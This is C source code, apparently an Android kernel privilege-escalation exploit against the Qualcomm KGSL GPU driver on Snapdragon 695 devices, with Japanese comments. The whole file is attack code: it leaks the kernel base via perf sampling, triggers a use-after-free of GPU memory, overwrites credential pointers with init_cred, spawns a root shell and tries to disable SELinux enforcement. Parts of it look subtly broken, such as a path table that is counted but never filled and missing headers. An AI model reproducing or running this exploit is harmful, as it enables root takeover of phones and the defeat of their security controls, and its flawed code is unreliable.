

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <pthread.h>
#include <poll.h>

/* ============ KGSL 定義 ============ */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define UAF_SIZE  0x10004000ULL
#define OVERLAP_SIZE 0x1000
#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
#define SPRAY_PIDS 2000
#define OVERLAP_COUNT 200

#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

static int kgsl_fd = -1;

static void die(const char *msg) { perror(msg); exit(1); }

/* ============ KGSL 基本操作 ============ */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}
static void gpuobj_munmap(void *addr, size_t size) {
    if (munmap(addr, size) < 0) die("gpuobj_munmap");
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

/* ============ KASLR 検出 ============ */
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ============ チャーン（AVCノード生成） ============ */
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round_intensive(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        struct stat st;
        stat(churn_paths[i], &st);
        access(churn_paths[i], R_OK);
    }
    char fake_path[256];
    for (int i = 0; i < 10000; i++) {
        snprintf(fake_path, sizeof(fake_path), "/proc/self/fd/%d", i);
        int fd = open(fake_path, O_RDONLY);
        if (fd >= 0) close(fd);
        snprintf(fake_path, sizeof(fake_path), "/sys/kernel/security/%d", i);
        fd = open(fake_path, O_RDONLY);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
    for (int i = 0; i < 100; i++) {
        int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
        if (fd >= 0) { write(fd, "1", 1); close(fd); }
        usleep(50);
    }
}

/* ============ 子プロセス ============ */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(int notify_pipe) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, "UAF_TASK");
            for (int j = 0; j < 600; j++) {
                if (getuid() == 0) {
                    write(notify_pipe, &p, sizeof(p));
                    // rootになったらシェルを起動（この中でsetenforce 0を実行可能）
                    execl("/system/bin/sh", "sh", NULL);
                    _exit(0);
                }
                usleep(100000);
            }
            _exit(0);
        } else if (p > 0) {
            spray_pids[n_spray++] = p;
        } else {
            break;
        }
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0);
}

/* ============ setenforce 0 ============ */
static int try_setenforce0(void) {
    int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
    if (fd < 0) return 0;
    ssize_t w = write(fd, "0", 1);
    close(fd);
    return (w == 1);
}

/* ============ メイン ============ */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] avc_bypass for Snapdragon 695 (Adreno 619) - 最終版\n");
    printf("[*] 戦略: UAF + 物理ページ再利用 → credポインタ書き換え → root化 → setenforce 0\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    // KASLR 検出
    uint64_t kaslr = detect_kaslr();
    if (!kaslr) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", init_cred_addr);

    // ---- Phase 1: 巨大オブジェクト確保 + mmap + munmap + 解放 ----
    printf("[*] Phase 1: Allocate large object, mmap, munmap, free\n");
    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int large_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    printf("[+] Large object id=%d\n", large_id);
    void *large_map = gpuobj_mmap(UAF_SIZE, large_id);
    printf("[+] mmap at %p\n", large_map);
    gpuobj_munmap(large_map, UAF_SIZE);
    printf("[+] munmap done\n");
    gpuobj_free(large_id);
    printf("[+] Freed\n");

    // ---- Phase 2: メモリ回収 ----
    printf("[*] Phase 2: Reclaim memory\n");
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);

    // ---- Phase 3: チャーン（AVCノードを同じページに配置させる） ----
    printf("[*] Phase 3: Intensive churn to place avc_nodes on freed pages\n");
    for (int c = 0; c < 5; c++) {
        churn_round_intensive();
        printf("[CHURN] round %d done\n", c+1);
    }

    // ---- Phase 4: 小さなオブジェクトを多数確保しmmap（解放ページの再利用を狙う） ----
    printf("[*] Phase 4: Allocate small objects to reuse freed pages, and mmap them\n");
    void *small_maps[OVERLAP_COUNT];
    int small_ids[OVERLAP_COUNT];
    int success = 0;

    for (int i = 0; i < OVERLAP_COUNT; i++) {
        int id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
        if (id < 0) continue;
        void *map = gpuobj_mmap(OVERLAP_SIZE, id);
        if (map == MAP_FAILED) { gpuobj_free(id); continue; }
        small_ids[success] = id;
        small_maps[success] = map;
        success++;
        if (success >= OVERLAP_COUNT) break;
    }
    printf("[+] Successfully mapped %d small objects\n", success);
    if (success == 0) {
        printf("[-] Failed to map any small objects\n");
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 5: 各マッピングにinit_credを書き込む（credポインタを上書き） ----
    printf("[*] Phase 5: Write init_cred to every 8-byte aligned offset in mapped pages\n");
    int writes = 0;
    for (int i = 0; i < success; i++) {
        uint64_t *ptr = (uint64_t *)small_maps[i];
        // ページ内の0x500〜0xA00を8バイト単位で書き込み（credポインタのオフセット範囲）
        for (uint64_t off = 0x500; off < 0xA00; off += 8) {
            ptr[off/8] = init_cred_addr;
            writes++;
        }
    }
    printf("[+] Total writes: %d\n", writes);
    __sync_synchronize();

    // ---- Phase 6: 子プロセスをスプレー（task_structが書き換えられたページに配置される） ----
    int pipefd[2];
    if (pipe(pipefd) < 0) die("pipe");
    fcntl(pipefd[0], F_SETFD, FD_CLOEXEC);
    fcntl(pipefd[1], F_SETFD, FD_CLOEXEC);

    spawn_spray(pipefd[1]);
    close(pipefd[1]);

    // ---- Phase 7: root化を待つ ----
    printf("[*] Phase 7: Waiting for root...\n");
    struct pollfd pfd = { .fd = pipefd[0], .events = POLLIN };
    pid_t winner = 0;
    if (poll(&pfd, 1, 30000) > 0 && read(pipefd[0], &winner, sizeof(winner)) == sizeof(winner)) {
        printf("[+] ROOT! PID=%d\n", winner);
        for (int i = 0; i < n_spray; i++) {
            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
        }
        while (waitpid(-1, NULL, WNOHANG) > 0);
        waitpid(winner, NULL, 0);
        printf("[+] Root shell exited.\n");
    } else {
        printf("[-] No child became root within timeout.\n");
        kill_spray_children();
        close(kgsl_fd);
        return 1;
    }

    // ---- Phase 8: SELinux状態確認 ----
    printf("[*] SELinux status:\n");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        char v[8]; ssize_t n = read(fd, v, sizeof(v)-1);
        close(fd);
        if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
    }

    // 念のためsetenforce 0を試す（rootなら成功するはず）
    if (try_setenforce0()) {
        printf("[+] SELinux permissive!\n");
    } else {
        printf("[-] setenforce 0 failed (but root shell may already be running)\n");
    }

    // 後片付け
    for (int i = 0; i < success; i++) {
        gpuobj_munmap(small_maps[i], OVERLAP_SIZE);
        gpuobj_free(small_ids[i]);
    }
    close(kgsl_fd);
    return 0;
}
